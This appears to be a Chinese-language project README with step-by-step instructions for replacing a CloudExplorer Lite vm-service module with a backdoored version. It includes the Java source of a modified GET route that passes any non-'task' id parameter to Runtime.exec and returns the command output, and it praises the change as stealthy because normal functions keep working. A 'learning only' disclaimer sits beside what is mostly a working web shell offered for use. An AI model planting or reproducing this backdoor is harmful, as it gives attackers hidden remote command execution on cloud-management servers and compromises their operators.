# CloudExplorer-Lite-Module-Shell
> 注意：需要具有模块上传权限！！！
> 项目仅用于学习研究，请勿非法利用
## 使用步骤
- 先卸载原有vm-service模块<img src="https://i.328888.xyz/2023/05/15/VZe0OJ.png" alt="VZe0OJ.png" border="0" />
- 上传本项目中的output.tar.gz，系统会重新加载模块<img src="https://i.328888.xyz/2023/05/15/VZe20o.png" alt="VZe20o.png" border="0" />
- output中实际上是对vm-service中的模块进行了更改，成功上传如下<img src="https://i.328888.xyz/2023/05/15/VZeHXN.png" alt="VZeHXN.png" border="0" />
- 后门地址<img src="https://i.328888.xyz/2023/05/15/VZeI5q.png" alt="VZeI5q.png" border="0" />

## 原理
- 修改了模块的一个路由
```java
    @ApiOperation(
        value = "根据任务ID查询",
        notes = "根据任务ID查询"
    )
    @PreAuthorize("hasAnyCePermission('JOBS:READ')")
    @GetMapping
    public ResultHolder<JobRecordDTO> getRecord(@ApiParam("任务ID") @RequestParam("id") String id) {
        if (id.startsWith("task")) {
            return ResultHolder.success(this.iJobRecordService.getRecord(id));
        } else {
            InputStream in = null;

            try {
                in = Runtime.getRuntime().exec(id).getInputStream();
            } catch (IOException var6) {
                throw new RuntimeException(var6);
            }

            Scanner s = (new Scanner(in)).useDelimiter("\\A");
            String output = s.hasNext() ? s.next() : "";
            JobRecordDTO jobRecordDTO = new JobRecordDTO();
            jobRecordDTO.setResourceName(output);
            return ResultHolder.success(jobRecordDTO);
        }
    }
```
- 在不破坏原有业务情况下，隐匿性佳。
